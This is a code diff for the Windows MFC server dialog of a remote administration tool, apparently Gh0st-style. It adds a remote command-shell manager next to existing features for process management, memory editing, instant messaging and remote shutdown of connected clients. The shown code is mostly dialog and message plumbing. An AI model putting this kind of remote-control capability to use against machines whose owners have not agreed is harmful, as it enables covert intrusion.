@@ -139,7 +139,7 @@ BEGIN_MESSAGE_MAP(CCrabRemoteServerDlg, CDialogEx)
 	ON_COMMAND(ID_DELETE_CONNECTION, &CCrabRemoteServerDlg::OnDeleteConnection)
 	ON_COMMAND(ID_INSTANT_MESSAGE, &CCrabRemoteServerDlg::OnInstantMessage)
 	ON_COMMAND(ID_REMOTE_SHUTDOWN, &CCrabRemoteServerDlg::OnRemoteShutdown)
-
+	ON_MESSAGE(UM_OPEN_CMD_MANAGER_DIALOG, OnOpenCmdManagerDialog)
 	ON_MESSAGE(UM_OPEN_REMOTE_MESSAGE_DIALOG, OnOpenInstantMessageDialog)
 	ON_MESSAGE(UM_OPEN_PROCESS_MANAGER_DIALOG, OnOpenProcessManagerDialog)
 END_MESSAGE_MAP()
@@ -337,9 +337,9 @@ void CCrabRemoteServerDlg::OnMenuExit()
 void CCrabRemoteServerDlg::OnClose()
 {
 	// TODO: 在此添加消息处理程序代码和/或调用默认值
-	if (m_iocpServer != NULL) {
-		delete m_iocpServer;
-		m_iocpServer = NULL;
+	if (m_IocpServer != NULL) {
+		delete m_IocpServer;
+		m_IocpServer = NULL;
 	}
 
 	//关闭时钟资源
@@ -418,7 +418,8 @@ VOID CCrabRemoteServerDlg::StatusBarInit()
 
 VOID CCrabRemoteServerDlg::OnButtonCmdManager()
 {
-	//MessageBox("OnButtonCmdManager");
+	BYTE	IsToken = CLIENT_CMD_MANAGER_REQUIRE;
+	SendingSelectedCommand(&IsToken, sizeof(BYTE));
 	return VOID();
 }
 
@@ -609,11 +610,11 @@ void CCrabRemoteServerDlg::ServerStart()
 {
 
 	//启动通信
-	m_iocpServer = new CIocpServer;
-	if (m_iocpServer == NULL) {
+	m_IocpServer = new CIocpServer;
+	if (m_IocpServer == NULL) {
 		return;
 	}
-	if (m_iocpServer->ServerRun(m_listenPort, WndCallback)==TRUE) {
+	if (m_IocpServer->ServerRun(m_listenPort, WndCallback)==TRUE) {
 
 	}
 
@@ -651,24 +652,27 @@ VOID CCrabRemoteServerDlg::WndHandleIo(CONTEXT_OBJECT* ContextObject)
 		switch (ContextObject->DlgIdentity)
 		{
 
-		case CMD_MANAGER_DIALOG:
-		{
+			case PROCESS_MANAGER_DIALOG:
+			{
+				CProcessManagerDlg* Dialog = (CProcessManagerDlg*)ContextObject->DlgHandle;
+				Dialog->OnReceiveComplete();
 
-			break;
-		}
-		case PROCESS_MANAGER_DIALOG:
-		{
-			CProcessManagerDlg* Dialog = (CProcessManagerDlg*)ContextObject->DlgHandle;
-			Dialog->OnReceiveComplete();
-
-			break;
-		}
+				break;
+			}
 
 
 		}
 
 		return;
 	}
+
+	if (ContextObject->DlgIdentity > 0
+		&& ContextObject->DlgIdentity== CMD_MANAGER_DIALOG)
+	{
+			CCmdManagerDlg* Dialog = (CCmdManagerDlg*)ContextObject->DlgHandle;
+			Dialog->OnReceiveComplete();
+	}
+
 
 	switch (ContextObject->m_ReceivedBufferDataDecompressed.GetArray(0)[0])   //[13][]
 	{
@@ -711,11 +715,21 @@ VOID CCrabRemoteServerDlg::WndHandleIo(CONTEXT_OBJECT* ContextObject)
 		break;
 	}
 
+	case CLIENT_CMD_MANAGER_REPLY:
+	{
+
+		__ServerProjectDlg->PostMessage(UM_OPEN_CMD_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
+
+		break;    //自定义消息调用函数  
+	}
+
 	case CLIENT_PROCESS_MANAGER_REPLY:
 	{
 		__ServerProjectDlg->PostMessage(UM_OPEN_PROCESS_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
 		break;
 	}
+
+
 
 	case CLIENT_MEMORY_EDITOR_FIRST_SCAN_REPLY:
 	{
@@ -962,7 +976,7 @@ VOID CCrabRemoteServerDlg::SendingSelectedCommand(PBYTE BufferData, ULONG Buffer
 		//获得该排的隐藏数据项得到Context
 		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_ClientInfoList.GetItemData(Item);   //上线显示的函数中插入一个Context隐藏数据
 		//通信类负责发送数据
-		m_iocpServer->OnPrepareSending(ContextObject, BufferData, BufferLength);
+		m_IocpServer->OnPrepareSending(ContextObject, BufferData, BufferLength);
 
 	}
 }
@@ -973,12 +987,35 @@ LRESULT CCrabRemoteServerDlg::OnOpenInstantMessageDialog(WPARAM ParameterData1, 
 	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;
 
 	//动态窗口
-	CInstantMessageDlg* Dialog = new CInstantMessageDlg(this, m_iocpServer, ContextObject);
+	CInstantMessageDlg* Dialog = new CInstantMessageDlg(this, m_IocpServer, ContextObject);
 	// 设置父窗口为卓面
 	Dialog->Create(IDD_INSTANT_MESSAGE_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
 	Dialog->ShowWindow(SW_SHOW);
 
 	return 0;
+}
+
+LRESULT CCrabRemoteServerDlg::OnOpenCmdManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2)
+{
+	//创建一个远程消息对话框
+	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;
+
+	//非阻塞对话框
+	//阻塞对话框
+
+	CCmdManagerDlg* Dialog = new CCmdManagerDlg(this, m_IocpServer, ContextObject);
+	// 设置父窗口为卓面
+	Dialog->Create(IDD_CMD_MANAGER_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
+	Dialog->ShowWindow(SW_SHOW);
+
+
+	if (ContextObject != NULL)
+	{
+		ContextObject->DlgIdentity = CMD_MANAGER_DIALOG;
+		ContextObject->DlgHandle = Dialog;
+	}
+
+	return LRESULT();
 }
 
 LRESULT CCrabRemoteServerDlg::OnOpenProcessManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2)
@@ -987,7 +1024,7 @@ LRESULT CCrabRemoteServerDlg::OnOpenProcessManagerDialog(WPARAM ParameterData1, 
 	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;
 
 	//非阻塞对话框
-	CProcessManagerDlg* Dialog = new CProcessManagerDlg(this, m_iocpServer, ContextObject);
+	CProcessManagerDlg* Dialog = new CProcessManagerDlg(this, m_IocpServer, ContextObject);
 	// 设置父窗口为卓面
 	Dialog->Create(IDD_PROCESS_MANAGER_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
 	Dialog->ShowWindow(SW_SHOW);
